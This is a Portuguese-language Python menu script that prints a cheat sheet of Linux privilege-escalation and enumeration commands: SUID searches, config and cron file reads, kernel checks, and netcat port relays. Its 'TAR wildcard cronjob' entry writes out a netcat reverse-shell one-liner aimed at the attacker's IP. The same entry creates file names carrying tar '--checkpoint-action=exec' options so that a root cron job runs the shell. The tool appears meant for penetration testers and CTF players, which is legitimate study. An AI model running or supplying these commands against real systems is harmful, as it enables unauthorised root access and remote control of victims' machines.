#BIBLIOTESCAS
#=============================
from os import system
from time import sleep
#=============================
#
#
#Funçao do Linux
def fun_linux():
	while True:
		system('clear')
		print("""
	        _ _                  
	       | (_)_ __  _   ___  __
	       | | | '_ \| | | \ \/ /
	       | | | | | | |_| |>  < 
	       |_|_|_| |_|\__,_/_/\_\ \n
	        - Lista de comandos úteis no Linux\n
	        [01] - SUID Commands
	        [02] - Versão do Sistema
	        [03] - Variável de Ambiente
	        [04] - Configurações de serviço
	        [05] - Outros usuários hospedam a comunicação com o sistema
	        [06] - Port Forward
	        [07] - TAR wildcard cronjob privilege escalation
	        [08] - Cron Jobs
	        [09] - Versão do Kernel
	        [10] - Menu
	        [99] - Sair """)
		
		cmd = str(input("===> "))

		if cmd == '1':
			system('clear')
			print("""
			╔═╗╦ ╦╦╔╦╗  ╔═╗╔═╗╔╦╗╔╦╗╔═╗╔╗╔╔╦╗╔═╗
			╚═╗║ ║║ ║║  ║  ║ ║║║║║║║╠═╣║║║ ║║╚═╗
			╚═╝╚═╝╩═╩╝  ╚═╝╚═╝╩ ╩╩ ╩╩ ╩╝╚╝═╩╝╚═╝         
	            - find / -user root -perm /4000 2>/dev/null
	            - find / -perm -u=s -type f 2>/dev/null
	            - find / -type f -name '*.txt' 2>/dev/null
	            - find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid
	            - getcap -r / 2>/dev/null
				""")
			input("[*] - Pressione ENTER para voltar...")
			fun_linux()
			break
		elif cmd == '2':
			system('clear')
			print("""
	         ╦  ╦╔═╗╦═╗╔═╗╔═╗╔═╗  ╔╦╗╔═╗  ╔═╗╦╔═╗╔╦╗╔═╗╔╦╗╔═╗
	         ╚╗╔╝║╣ ╠╦╝╚═╗╠═╣║ ║   ║║║ ║  ╚═╗║╚═╗ ║ ║╣ ║║║╠═╣
	          ╚╝ ╚═╝╩╚═╚═╝╩ ╩╚═╝  ═╩╝╚═╝  ╚═╝╩╚═╝ ╩ ╚═╝╩ ╩╩ ╩ \n          
	            - cat /etc/issue
	            - cat /etc/*-release
	            - cat /etc/lsb-release
	            - cat /etc/redhat-release """)
			input("[*] - Pressione ENTER para voltar...")
			fun_linux()
			break
		elif cmd == '3':
			system('clear')
			print("""
		╦  ╦╔═╗╦═╗╦╔═╗╦  ╦╔═╗╦    ╔╦╗╔═╗  ╔═╗╔╦╗╔╗ ╦╔═╗╔╗╔╔╦╗╔═╗
		╚╗╔╝╠═╣╠╦╝║╠═╣╚╗╔╝║╣ ║     ║║║╣   ╠═╣║║║╠╩╗║║╣ ║║║ ║ ║╣ 
	 	 ╚╝ ╩ ╩╩╚═╩╩ ╩ ╚╝ ╚═╝╩═╝  ═╩╝╚═╝  ╩ ╩╩ ╩╚═╝╩╚═╝╝╚╝ ╩ ╚═╝  \n                  
	             - cat /etc/profile
	             - cat /etc/bashrc
	             - cat ~/.bash_profile
	             - cat ~/.bashrc
	             - cat ~/.bash_logout
	             - env
	             - set """)
			input("[*] - Pressione ENTER para voltar...")
			fun_linux()
			break
		elif cmd == '4':
			system('clear')
			print("""
		╔═╗╔═╗╔╗╔╔╗╔╔═╗╦╔═╗╦ ╦╦═╗╔═╗╔═╗╔═╗╔═╗  ╔╦╗╔═╗  ╔═╗╔═╗╦═╗╦  ╦╦╔═╗╔═╗
		║  ║ ║║║║║║║╠╣ ║║ ╦║ ║╠╦╝╠═╣║ ║║╣ ╚═╗   ║║║╣   ╚═╗║╣ ╠╦╝╚╗╔╝║║ ║╚═╗
		╚═╝╚═╝╝╚╝╝╚╝╚  ╩╚═╝╚═╝╩╚═╩ ╩╚═╝╚═╝╚═╝  ═╩╝╚═╝  ╚═╝╚═╝╩╚═ ╚╝ ╩╚═╝╚═╝\n  
	            - cat /etc/syslog.conf
	            - cat /etc/chttp.conf
	            - cat /etc/lighttpd.conf
	            - cat /etc/cups/cupsd.conf
	            - cat /etc/inetd.conf
	            - cat /etc/apache2/apache2.conf
	            - cat /etc/my.conf
	            - cat /etc/httpd/conf/httpd.conf
	            - cat /opt/lampp/etc/httpd.conf
	            - ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/ """)
			input("[*] - Pressione ENTER para voltar...")
			fun_linux()
			break
		elif cmd == '5':
			system('clear')
			print("""
		╔═╗╦ ╦╔╦╗╦═╗╔═╗╔═╗  ╦ ╦╔═╗╦ ╦╔═╗╦═╗╦╔═╗╔═╗  ╦ ╦╔═╗╔═╗╔═╗╔═╗╔╦╗╔═╗╔╦╗
		║ ║║ ║ ║ ╠╦╝║ ║╚═╗  ║ ║╚═╗║ ║╠═╣╠╦╝║║ ║╚═╗  ╠═╣║ ║╚═╗╠═╝║╣  ║║╠═╣║║║
		╚═╝╚═╝ ╩ ╩╚═╚═╝╚═╝  ╚═╝╚═╝╚═╝╩ ╩╩╚═╩╚═╝╚═╝  ╩ ╩╚═╝╚═╝╩  ╚═╝═╩╝╩ ╩╩ ╩ \n
		╔═╗  ╔═╗╔═╗╔╦╗╦ ╦╔╗╔╦╔═╗╔═╗╔═╗╔═╗  ╔═╗╔═╗╔╦╗  ╔═╗  ╔═╗╦╔═╗╔╦╗╔═╗╔╦╗╔═╗
		╠═╣  ║  ║ ║║║║║ ║║║║║║  ╠═╣╠═╣║ ║  ║  ║ ║║║║  ║ ║  ╚═╗║╚═╗ ║ ║╣ ║║║╠═╣
		╩ ╩  ╚═╝╚═╝╩ ╩╚═╝╝╚╝╩╚═╝╩ ╩╩ ╩╚═╝  ╚═╝╚═╝╩ ╩  ╚═╝  ╚═╝╩╚═╝ ╩ ╚═╝╩ ╩╩ ╩ \n         
	               - lsof -i
	               - lsof -i :80
	               - grep 80 /etc/services
	               - netstat -antup
	               - netstat -antpx
	               - netstat -tulpn
	               - chkconfig --list
	               - chkconfig --list | grep 3:on
	               - last
	               - lastlog""")
			input("[*] - Pressione ENTER para voltar...")
			fun_linux()
			break
		elif cmd == '6':
			system("clear")
			print("""
			╔═╗╔═╗╦═╗╔╦╗  ╔═╗╔═╗╦═╗╦ ╦╔═╗╦═╗╔╦╗
			╠═╝║ ║╠╦╝ ║   ╠╣ ║ ║╠╦╝║║║╠═╣╠╦╝ ║║
			╩  ╚═╝╩╚═ ╩   ╚  ╚═╝╩╚═╚╩╝╩ ╩╩╚══╩╝\n            
	            - FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
	            - FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
	            - ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
	            - ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port
	            - ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port
	            - mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
	            - mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe # Port Relay
	            - mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a - outflow 1>backpipe # Proxy (Port 80 to 8080)
	            - backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc
	            - localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)""")
			input("[*] - Pressione ENTER para voltar...")
			fun_linux()
			break
		elif cmd == '7':
			system("clear")
			print("""
			╔═╗╦═╗╦╦  ╦╦╦  ╔═╗╔═╗╔═╗  ╔═╗╔═╗╔═╗╔═╗╦  ╔═╗╔╦╗╦╔═╗╔╗╔  ╔═╗╦═╗╔═╗╔╗╔ ╦╔═╗╔╗ 
			╠═╝╠╦╝║╚╗╔╝║║  ║╣ ║ ╦║╣   ║╣ ╚═╗║  ╠═╣║  ╠═╣ ║ ║║ ║║║║  ║  ╠╦╝║ ║║║║ ║║ ║╠╩╗
			╩  ╩╚═╩ ╚╝ ╩╩═╝╚═╝╚═╝╚═╝  ╚═╝╚═╝╚═╝╩ ╩╩═╝╩ ╩ ╩ ╩╚═╝╝╚╝  ╚═╝╩╚═╚═╝╝╚╝╚╝╚═╝╚═╝\n 
	              
	          - echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> 1234 >/tmp/f" > - - - shell.sh
	          - touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
	          - touch "/var/www/html/--checkpoint=1" """)
			input("[*] - Pressione ENTER para voltar...")
			fun_linux()
			break
		elif cmd == '8':
			system("clear")
			print("""
			╔═╗╦═╗╔═╗╔╗╔   ╦╔═╗╔╗ ╔═╗
			║  ╠╦╝║ ║║║║   ║║ ║╠╩╗╚═╗
			╚═╝╩╚═╚═╝╝╚╝  ╚╝╚═╝╚═╝╚═╝\n   
	            - crontab -l
	            - ls -alh /var/spool/cron
	            - ls -al /etc/ | grep cron
	            - ls -al /etc/cron*
	            - cat /etc/cron*
	            - cat /etc/at.allow
	            - cat /etc/at.deny
	            - cat /etc/cron.allow
	            - cat /etc/cron.deny
	            - cat /etc/crontab
	            - cat /etc/anacrontab
	            - cat /var/spool/cron/crontabs/root""")
			input("[*] - Pressione ENTER para voltar...")
			fun_linux()
			break
		elif cmd == '9':
			system("clear")
			print("""
			╦  ╦╔═╗╦═╗╔═╗╔═╗╔═╗  ╔╦╗╔═╗  ╦╔═╔═╗╦═╗╔╗╔╔═╗╦  
			╚╗╔╝║╣ ╠╦╝╚═╗╠═╣║ ║   ║║║ ║  ╠╩╗║╣ ╠╦╝║║║║╣ ║  
			 ╚╝ ╚═╝╩╚═╚═╝╩ ╩╚═╝  ═╩╝╚═╝  ╩ ╩╚═╝╩╚═╝╚╝╚═╝╩═╝ \n 
	              
	          - cat /proc/version
	          - uname -a
	          - uname -mrs
	          - rpm -q kernel
	          - dmesg | grep Linux
	          - ls /boot | grep vmlinuz""")
			input("[*] - Pressione ENTER para voltar...")
			fun_linux()
			break
		elif cmd == '10':
			break
		elif cmd == '99':
			print("Até logo...")
			exit()
		else:
			print("Comando Inválido!!!")
			sleep(2)






